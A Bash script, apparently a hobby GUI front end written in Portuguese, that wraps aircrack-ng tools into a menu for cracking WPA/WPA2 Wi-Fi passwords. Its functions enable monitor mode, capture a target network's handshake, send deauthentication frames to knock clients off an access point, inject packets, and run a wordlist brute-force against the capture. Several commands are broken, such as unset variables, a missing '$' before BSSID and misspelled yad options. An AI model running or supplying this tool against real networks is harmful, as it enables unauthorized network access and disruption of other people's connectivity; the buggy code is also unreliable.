#!/bin/bash

TITLE="Cracking WPA/WPA2"
DATE=$(date +'%d-%m-%y-%H-%M')	
AUTHOR="João Lucas <joaolucas@linuxmail.org>"
VERSION="0.1"
LICENSE="GPL"


function_verificar_usuario(){
	if [ `id -u` != "0" ] 
	then
		yad --title="$TITLE" \
		--text="Execute o script como root!" \
		--image error \
		--image-on-top \
		--timeout=5 \
		--timeout-indicador=button \
		--button gtk-ok \
		--center
		exit 1	
	fi
}

function_about(){
	yad --text="$TITLE \nversão $VERSION \n\nCracking WPA/WPA2 utilizando suite aircrack-ng e yad dialog \n\nSoftware sob a licença GNU GPL versão3 \nCodigo fonte disponível no Github \n<https://github.com/joao-lucas/Shell-script> \n\nAuthor: $AUTHOR" \
		--text-align=center \
                --image gtk-about \
                --image-on-top \
                --button gtk-close \
                --no-markup \
                --undecorated \
                --buttons-layout="center" \
		--center
}


function_modo_monitoramento(){
	airmon-ng start $INTERFACE | yad --title "$TITLE" \
	--text-info \
	--maximized \
	--button gtk-ok	
}

function_escanear_todas_redes(){
	airodump-ng $INTERFACE_MON | yad --tile "$TITLE" \
	--text-info \
	--text="Anote ESSID, BSSID e CHANNEL" \
	--image find \
	--image-on-top \
	--maximized \
	--button gtk-ok
}

function_escanear_uma_rede(){
	PARAMETROS=$(yad --title "$TITLE" \
	--form \
	--center \
	--field "BSSID" "" \
	--field "ESSID" "" \
	--field "Channel" "" \
	--field "Interface Mon" "eth0mon" \
	--field "Salvar em" "$DATE.cap" \
	#--field "Salvar na pasta":BTN "yad --title $TITLE --maximized --file --directory" \
	--button gtk-cancel \
	--button gtk-ok );
	
	BSSID=$(echo "$PARAMETROS" | cut -d '|' -f 1)
	ESSID=$(echo "$PARAMETROS" | cut -d '|' -f 2)
	CHANNEL=$(echo "$PARAMETROS" | cut -d '|' -f 3)
	INTERFACE_MON=$(echo "$PARAMETROS" | cut -d '|' -f 4)	
	#DIR=$(echo "$PARAMETROS" | cut -d '|' -f 5)
	ARQ=$(echo "$PARAMETROS" | cut -d '|' -f 5)

	airodump-ng --bssid $BSSID \
	--essid $ESSID \
	--channel $CHANNEL \
	--write $DIR/$ARQ \
	$INTERFACE_MON | yad --title "$TITLE" \
	--text-info \
	--image find \
	--image-on-top \
	--maximized \
	--button gtk-ok
}


function_deauth(){
	aireplay-ng --deauth 1 -a BSSID -e $ESSID $INTERFACE_MON | yad --title $TITLE \
	--text-info \
	--maximized \
	--button-ok 
}

function_injetar(){
	aireplay-ng --interactive 1000 -c $CLIENTE $INTERFACE_MON | yad --title $TITLE \
	--text-info \
	--maximized \
	--button gtk-ok \
        --buttons-layout="center"
} 

function_quebrar(){
        aircrack-ng -w $WORD_LIST $ARQ | yad --title $TITLE \
	--text-info \
	--maximized \
	--button gtk-ok \
        --buttons-layout="center"
}

function_menu(){
	while true
	do
		MENU=$(yad --title "$TITLE" \
			--list \
			--text="Cracking wpa/wpa2" \
			--column="Icones:IMG" \
			--column="Opção" \
			--column="Descrição" \
			--image emblem-debian \
			--image-on-top \
			--maximized \
			--no-buttons \
			find "Monitor" "Ativar modo monitoramento" \
			find "Escanear" "Escanear todas redes alcançadas" \
			find "Escanear uma rede" "Escanear apenas uma rede especifica" \
			emblem-debian "Deauth" "Fazer desautenticação dos hosts no AP" \
			emblem-debian "Injetar" "Injetar pacotes no AP" \
			emblem-debian "Quebrar" "Tentar quebrar a senha com força bruta" \
			gtk-about "Sobre" "Informações sobre o script" \
			gtk-quit "Sair" "Sair do script")

		MENU=$(echo $MENU | cut -d "|" -f2)

		case $MENU in
		"Monitor") function_modo_monitoramento ;;
		"Escanear") function_escanear_todas_redes ;;
		"Escanear uma rede") function_escanear_uma_rede ;;
		"Deauth") function_deauth ;;
		"Injetar") function_injetar ;;
		"Quebrar") function_quebrar ;; 
		"Sobre") function_about ;;
		"Sair") exit 0 ;;
	esac
done
}


function_verificar_usuario
function_menu
